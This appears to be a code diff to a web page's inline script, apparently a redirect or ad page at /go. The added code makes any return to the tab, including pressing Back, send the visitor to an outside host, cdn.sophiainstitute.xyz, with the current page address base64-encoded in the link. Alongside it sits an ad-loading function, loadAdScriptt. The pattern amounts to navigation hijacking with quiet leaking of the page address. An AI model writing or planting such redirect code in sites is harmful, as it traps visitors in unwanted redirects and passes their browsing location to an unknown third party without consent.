@@ -8,13 +8,21 @@ permalink: /go
 <script src="script1.js?v2">
 </script>
 <script>
+	function enBase64(input) {
+  try {
+    return btoa(unescape(encodeURIComponent(input)));
+  } catch (e) {
+    console.error("Encoding gagal: ", e);
+    return null;
+  }
+	}
 window.addEventListener('pageshow', (event) => {
     if (event.persisted) {
-location.href = "//cdn.sophiainstitute.xyz/to?t="+location.href;
+location.href = "//cdn.sophiainstitute.xyz/to?t="+enBase64(location.href);
     }
 });document.addEventListener('visibilitychange', () => {
     if (document.visibilityState === 'visible') {
-location.href = "//cdn.sophiainstitute.xyz/to?t="+location.href
+location.href = "//cdn.sophiainstitute.xyz/to?t="+enBase64(location.href)
     }
 });
 	function loadAdScriptt() {
